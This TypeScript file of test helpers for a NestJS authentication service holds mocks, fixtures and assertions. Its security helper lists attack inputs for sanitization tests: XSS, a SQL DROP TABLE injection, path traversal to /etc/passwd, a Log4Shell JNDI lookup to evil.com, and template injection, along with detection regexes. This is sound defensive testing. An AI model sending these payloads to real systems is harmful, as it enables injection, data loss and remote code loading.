import { Test, TestingModule } from '@nestjs/testing';
import { ConfigService } from '@nestjs/config';
import { JwtService } from '@nestjs/jwt';
import { PrismaService } from '../../infrastructure/prisma/prisma.service';
import { RedisService } from '../../infrastructure/redis/redis.service';
import { LoggerService } from '../../infrastructure/observability/logger.service';
import { TokenDenylistService } from '../../infrastructure/security/token-denylist.service';
import { UserRole } from '../../common/types';

/**
 * Test Database Helper
 * Provides utilities for database testing
 */
export class TestDatabaseHelper {
  static async cleanDatabase(prisma: PrismaService): Promise<void> {
    // Clean up in reverse dependency order
    await prisma.userTenant.deleteMany();
    await prisma.user.deleteMany();
    await prisma.tenant.deleteMany();
  }

  static async createTestUser(
    prisma: PrismaService,
    overrides: Partial<any> = {},
  ) {
    return prisma.user.create({
      data: {
        email: 'test@example.com',
        name: 'Test User',
        password: '$2b$12$hashedpassword',
        roles: [UserRole.BUYER],
        status: 'ACTIVE',
        isEmailVerified: false,
        ...overrides,
      },
    });
  }

  static async createTestTenant(
    prisma: PrismaService,
    overrides: Partial<any> = {},
  ) {
    return prisma.tenant.create({
      data: {
        name: 'Test Tenant',
        slug: 'test-tenant',
        type: 'MARKETPLACE',
        status: 'ACTIVE',
        ...overrides,
      },
    });
  }
}

/**
 * Mock Services Factory
 * Creates mock implementations of services for testing
 */
export class MockServicesFactory {
  static createMockPrismaService() {
    return {
      user: {
        create: jest.fn(),
        findUnique: jest.fn(),
        findFirst: jest.fn(),
        findMany: jest.fn(),
        update: jest.fn(),
        delete: jest.fn(),
        deleteMany: jest.fn(),
      },
      tenant: {
        create: jest.fn(),
        findUnique: jest.fn(),
        findMany: jest.fn(),
        deleteMany: jest.fn(),
      },
      userTenant: {
        create: jest.fn(),
        findMany: jest.fn(),
        deleteMany: jest.fn(),
      },
      $transaction: jest.fn(),
    };
  }

  static createMockRedisService() {
    return {
      get: jest.fn(),
      set: jest.fn(),
      del: jest.fn(),
      exists: jest.fn(),
      expire: jest.fn(),
      keys: jest.fn(),
    };
  }

  static createMockJwtService() {
    return {
      sign: jest.fn(),
      signAsync: jest.fn(),
      verify: jest.fn(),
      verifyAsync: jest.fn(),
      decode: jest.fn(),
    };
  }

  static createMockConfigService() {
    return {
      get: jest.fn((key: string) => {
        const config = {
          JWT_SECRET: 'test-jwt-secret',
          JWT_EXPIRES_IN: '15m',
          JWT_REFRESH_SECRET: 'test-refresh-secret',
          JWT_REFRESH_EXPIRES_IN: '7d',
        };
        return config[key];
      }),
    };
  }

  static createMockLoggerService() {
    return {
      log: jest.fn(),
      error: jest.fn(),
      warn: jest.fn(),
      debug: jest.fn(),
      verbose: jest.fn(),
    };
  }

  static createMockTokenDenylistService() {
    return {
      denyToken: jest.fn(),
      isTokenDenied: jest.fn(),
      cleanupExpiredTokens: jest.fn(),
    };
  }
}

/**
 * Test Data Factory
 * Provides test data for various scenarios
 */
export class TestDataFactory {
  static createValidRegisterDto() {
    return {
      email: 'newuser@example.com',
      name: 'New User',
      password: 'SecurePassword123!',
      phone: '+1234567890',
    };
  }

  static createValidLoginDto() {
    return {
      email: 'test@example.com',
      password: 'SecurePassword123!',
    };
  }

  static createValidGoogleAuthDto() {
    return {
      googleToken: 'valid-google-token',
    };
  }

  static createTestUser(overrides: Partial<any> = {}) {
    return {
      id: 'user-123',
      email: 'test@example.com',
      name: 'Test User',
      phone: '+1234567890',
      password: '$2b$12$hashedpassword',
      roles: [UserRole.BUYER],
      status: 'ACTIVE',
      isEmailVerified: false,
      isPhoneVerified: false,
      lastLoginAt: null,
      deletedAt: null,
      deletedBy: null,
      createdAt: new Date(),
      updatedAt: new Date(),
      ...overrides,
    };
  }

  static createJwtPayload(overrides: Partial<any> = {}) {
    return {
      sub: 'user-123',
      email: 'test@example.com',
      roles: [UserRole.BUYER],
      iat: Math.floor(Date.now() / 1000),
      exp: Math.floor(Date.now() / 1000) + 900, // 15 minutes
      ...overrides,
    };
  }

  static createAuthTokens() {
    return {
      accessToken:
        'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyLTEyMyIsImVtYWlsIjoidGVzdEBleGFtcGxlLmNvbSIsInJvbGVzIjpbIkJVWUVSIl0sImlhdCI6MTY0MDk5NTIwMCwiZXhwIjoxNjQwOTk2MTAwfQ.signature',
      refreshToken:
        'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyLTEyMyIsImVtYWlsIjoidGVzdEBleGFtcGxlLmNvbSIsInJvbGVzIjpbIkJVWUVSIl0sImlhdCI6MTY0MDk5NTIwMCwiZXhwIjoxNjQxNjAwMDAwfQ.signature',
    };
  }
}

/**
 * Test Module Builder
 * Helps create testing modules with proper mocks
 */
export class TestModuleBuilder {
  static async createAuthTestingModule(
    customProviders: any[] = [],
  ): Promise<TestingModule> {
    return Test.createTestingModule({
      providers: [
        {
          provide: PrismaService,
          useValue: MockServicesFactory.createMockPrismaService(),
        },
        {
          provide: RedisService,
          useValue: MockServicesFactory.createMockRedisService(),
        },
        {
          provide: JwtService,
          useValue: MockServicesFactory.createMockJwtService(),
        },
        {
          provide: ConfigService,
          useValue: MockServicesFactory.createMockConfigService(),
        },
        {
          provide: LoggerService,
          useValue: MockServicesFactory.createMockLoggerService(),
        },
        {
          provide: TokenDenylistService,
          useValue: MockServicesFactory.createMockTokenDenylistService(),
        },
        ...customProviders,
      ],
    }).compile();
  }
}

/**
 * Test Assertions Helper
 * Common assertions for testing
 */
export class TestAssertions {
  static expectValidAuthResponse(response: any) {
    expect(response).toHaveProperty('accessToken');
    expect(response).toHaveProperty('refreshToken');
    expect(response).toHaveProperty('user');
    expect(response.user).toHaveProperty('id');
    expect(response.user).toHaveProperty('email');
    expect(response.user).toHaveProperty('name');
    expect(response.user).toHaveProperty('roles');
    expect(response.user).not.toHaveProperty('password');
  }

  static expectValidUser(user: any) {
    expect(user).toHaveProperty('id');
    expect(user).toHaveProperty('email');
    expect(user).toHaveProperty('name');
    expect(user).toHaveProperty('roles');
    expect(user).toHaveProperty('status');
    expect(user).toHaveProperty('createdAt');
    expect(user).toHaveProperty('updatedAt');
    expect(user).not.toHaveProperty('password');
  }

  static expectValidJwtToken(token: string) {
    expect(token).toBeDefined();
    expect(typeof token).toBe('string');
    expect(token.split('.')).toHaveLength(3); // JWT has 3 parts
  }
}

/**
 * Test Error Helper
 * Provides common error scenarios for testing
 */
export class TestErrorHelper {
  static createDuplicateEmailError() {
    const error = new Error('Unique constraint failed');
    (error as any).code = 'P2002';
    (error as any).meta = { target: ['email'] };
    return error;
  }

  static createNotFoundError() {
    const error = new Error('Record not found');
    (error as any).code = 'P2025';
    return error;
  }

  static createDatabaseConnectionError() {
    const error = new Error('Database connection failed');
    (error as any).code = 'P1001';
    return error;
  }
}

/**
 * Test Performance Helper
 * Utilities for performance testing
 */
export class TestPerformanceHelper {
  static async measureExecutionTime<T>(
    fn: () => Promise<T>,
  ): Promise<{ result: T; duration: number }> {
    const start = process.hrtime.bigint();
    const result = await fn();
    const end = process.hrtime.bigint();
    const duration = Number(end - start) / 1000000; // Convert to milliseconds
    return { result, duration };
  }

  static expectExecutionTimeUnder(duration: number, maxDuration: number) {
    expect(duration).toBeLessThan(maxDuration);
  }
}

/**
 * Test Security Helper
 * Security-related test utilities
 */
export class TestSecurityHelper {
  static createMaliciousPayloads() {
    return [
      '<script>alert("xss")</script>',
      "'; DROP TABLE users; --",
      '../../../etc/passwd',
      '${jndi:ldap://evil.com/a}',
      '{{7*7}}',
    ];
  }

  static expectSanitizedOutput(output: string) {
    const maliciousPatterns = [
      /<script/i,
      /javascript:/i,
      /on\w+=/i,
      /drop\s+table/i,
      /union\s+select/i,
    ];

    maliciousPatterns.forEach((pattern) => {
      expect(output).not.toMatch(pattern);
    });
  }
}

/**
 * Test Environment Helper
 * Environment setup utilities
 */
export class TestEnvironmentHelper {
  static setTestEnvironmentVariables() {
    process.env.NODE_ENV = 'test';
    process.env.JWT_SECRET = 'test-jwt-secret-32-characters-long';
    process.env.JWT_REFRESH_SECRET = 'test-refresh-secret-32-characters';
    process.env.DATABASE_URL = 'postgresql://test:test@localhost:5432/test_db';
    process.env.REDIS_URL = 'redis://localhost:6379/1';
  }

  static cleanupTestEnvironment() {
    delete process.env.NODE_ENV;
    delete process.env.JWT_SECRET;
    delete process.env.JWT_REFRESH_SECRET;
    delete process.env.DATABASE_URL;
    delete process.env.REDIS_URL;
  }
}
